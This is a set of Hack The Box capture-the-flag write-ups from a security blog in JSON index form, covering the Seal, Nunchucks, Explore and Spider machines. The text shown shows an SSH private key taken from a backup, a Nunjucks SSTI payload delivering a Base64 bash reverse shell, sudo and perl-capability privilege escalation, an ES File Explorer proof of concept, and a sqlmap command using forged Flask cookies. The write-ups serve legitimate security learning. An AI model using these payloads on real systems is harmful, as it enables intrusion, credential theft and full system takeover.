lrwxrwxrwx 1 tomcat tomcat 22 Oct 25 20:00 id_rsa -\u0026gt; /home/luis/.ssh/id_rsa Then we see that the the backup is created, so we can copy it into /tmp and decompress it:\ntomcat@seal:/var/lib/tomcat9$ cd /tmp tomcat@seal:/tmp$ ls -la /opt/backups/archives/ total 604 drwxrwxr-x 2 luis luis 4096 Jul 15 16:05 . drwxr-xr-x 4 luis luis 4096 Jul 15 16:05 .. -rw-rw-r-- 1 luis luis 608921 Jul 15 16:05 backup-2021-07-15-16:05:32.gz tomcat@seal:/tmp$ cp /opt/backups/archives/backup-2021-07-15-16:05:32.gz /tmp/backup.tar.gz tomcat@seal:/tmp$ tar -xf backup.tar.gz With this process, we have exploited the permissions misconfiguration and obtained the SSH private key (id_rsa) of user luis:\ntomcat@seal:/tmp$ ls -la total 1208 drwxrwxrwt 4 root root 4096 Jul 15 16:06 . drwxr-xr-x 20 root root 4096 May 7 09:26 .. -rw-r----- 1 tomcat tomcat 608921 Jul 15 16:06 backup.tar.gz drwxr-x--- 7 tomcat tomcat 4096 May 7 09:26 dashboard drwxr-x--- 2 tomcat tomcat 4096 Jul 15 15:34 hsperfdata_tomcat tomcat@seal:/tmp$ ls -la dashboard/uploads/ total 12 drwxr-x--- 2 tomcat tomcat 4096 Jul 15 16:06 . drwxr-x--- 7 tomcat tomcat 4096 May 7 09:26 .. -rw------- 1 tomcat tomcat 2590 May 7 06:10 id_rsa tomcat@seal:/tmp$ cat dashboard/uploads/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE= -----END OPENSSH PRIVATE KEY----- Now we have access as luis using SSH and we can read the user.txt flag:\n$ ssh -i id_rsa luis@10.10.10.250 luis@seal:~$ cat user.txt cd731341c30363c7787b8dc5132a8cbe Privilege escalation with sudo This user can execute ansible-playbook as the root user with sudo:\nluis@seal:~$ sudo -l Matching Defaults entries for luis on seal:  env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User luis may run the following commands on seal:  (ALL) NOPASSWD: /usr/bin/ansible-playbook * With Ansible Playbooks it is possible to run system commands (more information here), so we simply add SUID permissions to /bin/bash and rooted (there is also a GTFOBin).\nWe first create a YAML file with the actions we want to trigger:\n- hosts: localhost  tasks:  - command: chmod u+s /bin/bash  Then using that YAML file, we can execute ansible-playbook and change permissions to /bin/bash:\nluis@seal:~$ cd /tmp luis@seal:/tmp$ vim file.yaml luis@seal:/tmp$ cat file.yaml - hosts: localhost  tasks:  - command: chmod u+s /bin/bash luis@seal:~$ sudo /usr/bin/ansible-playbook file.yaml [WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match \u0026#39;all\u0026#39; PLAY [localhost] ********************************************************************************************************************************************* TASK [Gathering Facts] *************************************************************************************************************************************** ok: [localhost] TASK [command] *********************************************************************************************************************************************** [WARNING]: Consider using the file module with mode rather than running \u0026#39;chmod\u0026#39;. If you need to use command because file is insufficient you can add \u0026#39;warn: false\u0026#39; to this command task or set \u0026#39;command_warnings=False\u0026#39; in ansible.cfg to get rid of this message. changed: [localhost] PLAY RECAP *************************************************************************************************************************************************** localhost : ok=2 changed=1 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 luis@seal:/tmp$ ls -la /bin/bash -rwsr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash Finally, we can enter as root and read the root.txt flag:\nluis@seal:/tmp$ bash -p bash-5.0# cat /root/root.txt 9fbff7ee6bedac04af30edca3ad223e6 ","image":"/images/HTB/Seal/Seal.png","permalink":"https://7rocky.github.io/en/htb/seal/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine contains a Tomcat website on top of nginx, which has a configuration vulnerability that leads to Remote Code Execution (RCE), then it has some misconfigurations related to file permissions and sudo commands. Knowledge about Tomcat exploitation and Linux file system is needed to compromise this machine","time":8,"title":"Seal"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.122   Release: 02 / 11 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.122 -p 22,80,443 Nmap scan report for 10.10.11.122 Host is up (0.061s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA) | 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA) |_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://nunchucks.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) | tls-nextprotoneg: |_ http/1.1 |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Nunchucks - Landing Page | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK | Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb | Not valid before: 2021-08-30T15:42:24 |_Not valid after: 2031-08-28T15:42:24 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 18.56 seconds  This machine has ports 22 (SSH), 80 (HTTP) and 443 (HTTPS) open.\nWeb enumeration First, we start looking at port 80. If we enter the IP into the browser, the server will redirect to https://nunchucks.htb. Then, we need to include nunchucks.htb into /etc/hosts. Now, we can see their landing page:\nWe can try to register a new account, but it seems to be disabled:\nThe same applies for the login page:\nSo, it seems that there is nothing vulnerable here at first glance. Fuzzing for routes does not give anything interesting.\nFinding another subdomain Let\u0026rsquo;s see if there are other subdomains, because the server might be using virtual hosts. For that, we can use gobuster:\n$ gobuster vhost -w $WORDLISTS/dirb/common.txt -u https://nunchucks.htb -k -q Found: store.nunchucks.htb (Status: 200) [Size: 4029]  And we have another valid subdomain. After adding it to /etc/hosts, we enter to the following page:\nAgain, fuzzing does not give any useful routes. The only thing we can interact with is the email field:\nThe server is showing the technology used in the HTTP response headers:\n$ curl -Ik https://store.nunchucks.htb HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Content-Type: text/html; charset=utf-8 Content-Length: 4029 Connection: keep-alive X-Powered-By: Express set-cookie: _csrf=A-Vn2_f9HxsB2GJ2Fii2pQkA; Path=/ ETag: W/\"fbd-udK+KYlYFVN2Nn2DXdm1EXd8mv0\"  As it is shown the server runs Express JS, which is a Node.js module. There must be some kind of vulnerability related to this technology.\nExploiting an SSTI vulnerability Thinking on the name of the machine (Nunchucks), there is a template engine for Node.js called Nunjucks. Maybe, the email field is vulnerable to Server-Side Template Injection (SSTI).\nTo check if it is vulnerable, the common payload is to send:\n{{7*7}}  And see if it responds with 49. Using the POST request in curl, we see that the payload works:\n$ curl https://store.nunchucks.htb/api/submit -d '{\"email\":\"{{7*7}}\"}' -kH 'Content-Type: application/json' {\"response\":\"You will receive updates on the following email address: 49.\"}  Now we know it is vulnerable, we can look for malicious payloads to gain Remote Code Execution (RCE). The following payload can be found here:\n{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"whoami\")')()}}  To use the payload in the curl command, we need to use a third type of quote because the payload is encapsulated into a JSON document. One solution is to use backticks (`), which is supported by JavaScript, and they must be escaped because we are in a shell environment (another solution could have been to escape or double-escape normal quotes):\n$ curl https://store.nunchucks.htb/api/submit -d \"{\\\"email\\\":\\\"{{range.constructor('return global.process.mainModule.require(\\`child_process\\`).execSync(\\`whoami\\`)')()}}\\\"}\" -kH 'Content-Type: application/json' {\"response\":\"You will receive updates on the following email address: david\\n.\"}  Now, we have got RCE, so we can obtain a reverse shell as user david.\nFoothold on the machine For the reverse shell payload, we can encode the Bash command in Base64 to prevent issues:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  {{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\")')()}}  Now, we send the previous SSTI payload (again, using backticks):\n$ curl https://store.nunchucks.htb/api/submit -d \"{\\\"email\\\":\\\"{{range.constructor('return global.process.mainModule.require(\\`child_process\\`).execSync(\\`echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\\`)')()}}\\\"}\" -kH 'Content-Type: application/json'  And we get access to the machine as user david from the nc listener:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.122. Ncat: Connection from 10.10.11.122:44534. bash: cannot set terminal process group (997): Inappropriate ioctl for device bash: no job control in this shell david@nunchucks:/var/www/store.nunchucks$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null david@nunchucks:/var/www/store.nunchucks$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm david@nunchucks:/var/www/store.nunchucks$ export TERM=xterm david@nunchucks:/var/www/store.nunchucks$ export SHELL=bash david@nunchucks:/var/www/store.nunchucks$ stty rows 50 columns 158  At this point, we can capture the user.txt flag:\ndavid@nunchucks:/var/www/store.nunchucks$ cd david@nunchucks:~$ cat user.txt 3c5e34ff445df891a0ee282c3d98c6bb  Finding capabilities After usual enumeration, we find that perl has cap_setuid capability enabled:\ndavid@nunchucks:~$ getcap -r / 2/dev/null /usr/bin/perl = cap_setuid+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep  To escalate privilege, we can look at GTFOBins for perl, or use my tool gtfobins-cli:\n$ gtfobins-cli --capabilities perl perl ==\u0026gt; https://gtfobins.github.io/gtfobins/perl/ Capabilities If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID. cp $(which perl) . sudo setcap cap_setuid+ep perl ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'  Nevertheless, we execute the command and it does not work:\ndavid@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";' david@nunchucks:~$ whoami david david@nunchucks:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"whoami\";' root david@nunchucks:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"cat /etc/shadow\";' cat: /etc/shadow: Permission denied david@nunchucks:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"cat /root/root.txt\";' cat: /root/root.txt: Permission denied  Troubleshooting After doing some research, we see that there are some AppArmor rules that prevent us from executing some perl commands (for example, whoami is allowed, that\u0026rsquo;s why we saw previously root as the output):\ndavid@nunchucks:~$ ls -a /etc/apparmor.d/ . abstractions force-complain lsb_release sbin.dhclient usr.bin.man usr.sbin.ippusbxd usr.sbin.rsyslogd .. disable local nvidia_modprobe tunables usr.bin.perl usr.sbin.mysqld usr.sbin.tcpdump david@nunchucks:~$ cat /etc/apparmor.d/usr.bin.perl # Last Modified: Tue Aug 31 18:25:30 2021 #include \u0026lt;tunables/global\u0026gt; /usr/bin/perl { #include \u0026lt;abstractions/base\u0026gt; #include \u0026lt;abstractions/nameservice\u0026gt; #include \u0026lt;abstractions/perl\u0026gt; capability setuid, deny owner /etc/nsswitch.conf r, deny /root/* rwx, deny /etc/shadow rwx, /usr/bin/id mrix, /usr/bin/ls mrix, /usr/bin/cat mrix, /usr/bin/whoami mrix, /opt/backup.pl mrix, owner /home/ r, owner /home/david/ r, }  There is a bug for AppArmor that allows to bypass the protections if the perl code is executed from a file with a \u0026ldquo;shebang\u0026rdquo; (#!/usr/bin/perl).\nPrivilege escalation Abusing the bug, we can put the perl \u0026ldquo;one-liner\u0026rdquo; into a file with a \u0026ldquo;shebang\u0026rdquo;:\ndavid@nunchucks:~$ cd /tmp david@nunchucks:/tmp$ echo -e '#!/usr/bin/perl\\n\\nuse POSIX (setuid);\\nPOSIX::setuid(0);\\nexec \"/bin/bash\";'  .priv.pl david@nunchucks:/tmp$ cat .priv.pl  #!/usr/bin/perl usePOSIX (setuid); POSIX::setuid(0); exec\"/bin/bash\";  To execute the file, we must enable execution privileges and then execute it. Once it is done, we are root user and thus we can capture the root.txt flag:\ndavid@nunchucks:/tmp$ chmod +x .priv.pl david@nunchucks:/tmp$ ./.priv.pl root@nunchucks:/tmp# cat /root/root.txt 1890e79a33c09beb8878bec7a4595c25  ","image":"/images/HTB/Nunchucks/Nunchucks.png","permalink":"https://7rocky.github.io/en/htb/nunchucks/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine has a webpage vulnerable to Server-Side Template Injection (SSTI) and system capabilities set, but with some protections. Knowledge about Node.js templates and Perl are needed to compromise this machine","time":6,"title":"Nunchucks"},{"contents":"  OS: Android   Difficulty: Easy   IP Address: 10.10.10.247   Release: 26 / 06 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.247 -p 2222,5555,37019,42135,59777 Nmap scan report for 10.10.10.247 Host is up (0.090s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 37019/tcp open unknown ... 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn't have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn't have a title (text/plain). ... Service Info: Device: phone Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 104.70 seconds  This machine has ports 2222 (SSH), 37019, 42135 (ES File Explorer) and 59777 (Bukkit JSONAPI httpd for Minecraft) open. Port 5555 is filtered.\nExploiting ES File Explorer There is a PoC on Android ES File Explorer on port 59777, written in Python. With this, some files and apps can be listed and even downloaded:\n$ python3 poc.py --ip 10.10.10.247 --cmd listPics [*] Executing command: listPics on 10.10.10.247 [*] Server responded with: 200 {\"name\":\"concept.jpg\", \"time\":\"4/21/21 02:38:08 AM\", \"location\":\"/storage/emulated/0/DCIM/concept.jpg\", \"size\":\"135.33 KB (138,573 Bytes)\", }, {\"name\":\"anc.png\", \"time\":\"4/21/21 02:37:50 AM\", \"location\":\"/storage/emulated/0/DCIM/anc.png\", \"size\":\"6.24 KB (6,392 Bytes)\", }, {\"name\":\"creds.jpg\", \"time\":\"4/21/21 02:38:18 AM\", \"location\":\"/storage/emulated/0/DCIM/creds.jpg\", \"size\":\"1.14 MB (1,200,401 Bytes)\", }, {\"name\":\"224_anc.png\", \"time\":\"4/21/21 02:37:21 AM\", \"location\":\"/storage/emulated/0/DCIM/224_anc.png\", \"size\":\"124.88 KB (127,876 Bytes)\"}  We see four images saved in the device. The interesting one is called creds.jpg:\n$ python3 poc.py --ip 10.10.10.247 --get-file /storage/emulated/0/DCIM/creds.jpg [*] Getting file: /storage/emulated/0/DCIM/creds.jpg from: 10.10.10.247 [*] Server responded with: 200 [*] Writing to file: creds.jpg  The following creds.jpg image contains the credentials to login via SSH on port 2222 (kristi:Kr1sT!5h@Rp3xPl0r3!):\nSSH into the device $ ssh kristi@10.10.10.247 -p 2222 Password authentication Password: :/ $  The user.txt flag is located at /sdcard:\n:/ $ ls -la /sdcard/ total 52 drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Alarms drwxrwx--- 3 root everybody 4096 2021-03-13 17:16 Android drwxrwx--- 2 root everybody 4096 2021-04-21 02:38 DCIM drwxrwx--- 2 root everybody 4096 2021-03-13 17:37 Download drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Movies drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Music drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Notifications drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Pictures drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Podcasts drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Ringtones drwxrwx--- 3 root everybody 4096 2021-03-13 17:30 backups drwxrwx--- 2 root everybody 4096 2021-04-21 02:12 dianxinos -rw-rw---- 1 root everybody 33 2021-03-13 18:28 user.txt :/ $ cat /sdcard/user.txt f32017174c7c7e8f50c6da52891ae250  \u0026ldquo;Rooting\u0026rdquo; the device For \u0026ldquo;rooting\u0026rdquo; the device, it is needed to connect using adb and then enter adb root, adb shell. However, to connect to the device, adb needs port 5555 to be open in the device. But this port is filtered, as shown on the nmap output.\nTo bypass this protection, the connection can be done with SSH port forwarding:\n$ ssh -fNL 5000:localhost:5555 kristi@10.10.10.247 -p 2222  And now, adb can connect to the device from localhost:5000 and get the root.txt flag:\n$ adb kill-server $ adb start-server * daemon not running; starting now at tcp:5037 * daemon started successfully $ adb connect 127.0.0.1:5000 connected to 127.0.0.1:5000 $ adb devices List of devices attached 127.0.0.1:5000 device $ adb root $ adb shell x86_64:/ # find / -name root.txt 2\u0026gt;/dev/null /data/root.txt x86_64:/ # cat /data/root.txt f04fc82b6d49b41c9b08982be59338c5  ","image":"/images/HTB/Explore/Explore.png","permalink":"https://7rocky.github.io/en/htb/explore/","section":"htb","summary":"Hack The Box. Android. Easy machine. This is a mobile device that uses a vulnerable application that exposes files that provide access via SSH. Some port scanning, port forwarding and Android skills are needed to compromise this device","time":3,"title":"Explore"},{"contents":"  OS: Linux   Difficulty: Hard   IP Address: 10.10.10.243   Release: 29 / 05 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.243 -p 22,80 Nmap scan report for 10.10.10.243 Host is up (0.034s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA) | 256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA) |_ 256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://spider.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 11.15 seconds This machine has ports 22 (SSH) and 80 (HTTP) open.\nWeb exploration If we enter http://10.10.10.243, the server will redirect to http://spider.htb. This means that the server uses virtual hosting and we need to put spider.htb into /etc/hosts. Then, we can access the website:\nUsing gobuster we can find some directories:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -u http://spider.htb /index (Status: 200) [Size: 11273] /login (Status: 200) [Size: 1832] /register (Status: 200) [Size: 2130] /main (Status: 302) [Size: 219] [--\u0026gt; http://spider.htb/login] /user (Status: 302) [Size: 219] [--\u0026gt; http://spider.htb/login] /view (Status: 302) [Size: 219] [--\u0026gt; http://spider.htb/login] /cart (Status: 500) [Size: 290] /logout (Status: 302) [Size: 209] [--\u0026gt; http://spider.htb/] /checkout (Status: 500) [Size: 290] After inspecting the website, we can see that it is using Flask (a Python back-end framework) because the HTTP response status is in capital letters (i.e. OK, FOUND, NOT FOUND, INTERNAL SERVER ERROR\u0026hellip;), which is usual in Flask:\n$ curl -I spider.htb/asdf HTTP/1.1 404 NOT FOUND Server: nginx/1.14.0 (Ubuntu) Date: Sat, 23 Oct 2021 10:24:58 GMT Content-Type: text/html; charset=utf-8 Content-Length: 232 Connection: keep-alive Looking for SSTI Flask uses a template renderer called Jinja2, which might be vulnerable to Server-Side Template Injection (SSTI) if the server is misconfigured.\nThere is a Twitter account that appears at the website that points to a Cybersecurity researcher that wrote a blogpost on SSTI in Flask and Jinja2. This is actually a hint. There are other easter eggs that are related to the blogpost.\nThe SSTI vulnerability is at the username field when registering a new account. After registering, if you access your profile you will see the payload executed.\nWe can build a Python script called ssti.py to automate the process (detailed explanation here).\nHere there is a simple proof of concept:\n$ python3 ssti.py \u0026#39;{{7*7}}\u0026#39; 49 Obtaining Flask\u0026rsquo;s secret key Here we must take into account that the username field can have at most 10 characters, so there are not many payloads that we can inject. We can try to obtain contents of the Flask config variable:\n$ python3 ssti.py \u0026#39;{{config}}\u0026#39; \u0026lt;Config {\u0026#39;ENV\u0026#39;: \u0026#39;production\u0026#39;, \u0026#39;DEBUG\u0026#39;: False, \u0026#39;TESTING\u0026#39;: False, \u0026#39;PROPAGATE_EXCEPTIONS\u0026#39;: None, \u0026#39;PRESERVE_CONTEXT_ON_EXCEPTION\u0026#39;: None, \u0026#39;SECRET_KEY\u0026#39;: \u0026#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942\u0026#39;, \u0026#39;PERMANENT_SESSION_LIFETIME\u0026#39;: datetime.timedelta(31), \u0026#39;USE_X_SENDFILE\u0026#39;: False, \u0026#39;SERVER_NAME\u0026#39;: None, \u0026#39;APPLICATION_ROOT\u0026#39;: \u0026#39;/\u0026#39;, \u0026#39;SESSION_COOKIE_NAME\u0026#39;: \u0026#39;session\u0026#39;, \u0026#39;SESSION_COOKIE_DOMAIN\u0026#39;: False, \u0026#39;SESSION_COOKIE_PATH\u0026#39;: None, \u0026#39;SESSION_COOKIE_HTTPONLY\u0026#39;: True, \u0026#39;SESSION_COOKIE_SECURE\u0026#39;: False, \u0026#39;SESSION_COOKIE_SAMESITE\u0026#39;: None, \u0026#39;SESSION_REFRESH_EACH_REQUEST\u0026#39;: True, \u0026#39;MAX_CONTENT_LENGTH\u0026#39;: None, \u0026#39;SEND_FILE_MAX_AGE_DEFAULT\u0026#39;: datetime.timedelta(0, 43200), \u0026#39;TRAP_BAD_REQUEST_ERRORS\u0026#39;: None, \u0026#39;TRAP_HTTP_EXCEPTIONS\u0026#39;: False, \u0026#39;EXPLAIN_TEMPLATE_LOADING\u0026#39;: False, \u0026#39;PREFERRED_URL_SCHEME\u0026#39;: \u0026#39;http\u0026#39;, \u0026#39;JSON_AS_ASCII\u0026#39;: True, \u0026#39;JSON_SORT_KEYS\u0026#39;: True, \u0026#39;JSONIFY_PRETTYPRINT_REGULAR\u0026#39;: False, \u0026#39;JSONIFY_MIMETYPE\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;TEMPLATES_AUTO_RELOAD\u0026#39;: None, \u0026#39;MAX_COOKIE_SIZE\u0026#39;: 4093, \u0026#39;RATELIMIT_ENABLED\u0026#39;: True, \u0026#39;RATELIMIT_DEFAULTS_PER_METHOD\u0026#39;: False, \u0026#39;RATELIMIT_SWALLOW_ERRORS\u0026#39;: False, \u0026#39;RATELIMIT_HEADERS_ENABLED\u0026#39;: False, \u0026#39;RATELIMIT_STORAGE_URL\u0026#39;: \u0026#39;memory://\u0026#39;, \u0026#39;RATELIMIT_STRATEGY\u0026#39;: \u0026#39;fixed-window\u0026#39;, \u0026#39;RATELIMIT_HEADER_RESET\u0026#39;: \u0026#39;X-RateLimit-Reset\u0026#39;, \u0026#39;RATELIMIT_HEADER_REMAINING\u0026#39;: \u0026#39;X-RateLimit-Remaining\u0026#39;, \u0026#39;RATELIMIT_HEADER_LIMIT\u0026#39;: \u0026#39;X-RateLimit-Limit\u0026#39;, \u0026#39;RATELIMIT_HEADER_RETRY_AFTER\u0026#39;: \u0026#39;Retry-After\u0026#39;, \u0026#39;UPLOAD_FOLDER\u0026#39;: \u0026#39;static/uploads\u0026#39;}\u0026gt;  We have leaked the secret key that signs the session cookies. So, it is clear that we need to do something with the cookies.\nFinding SQL injection After searching for Flask sessions and cookies, there is a way we can inject SQL in the cookie using sqlmap and flask_unsign Python module (which can be installed using pip). More information can be found in HackTricks, just as follows:\n$ sqlmap --url http://spider.htb/ --eval \u0026#34;import flask_unsign; session = flask_unsign.session.sign({\u0026#39;cart_items\u0026#39;: [], \u0026#39;uuid\u0026#39;: session}, secret=\u0026#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942\u0026#39;)\u0026#34; 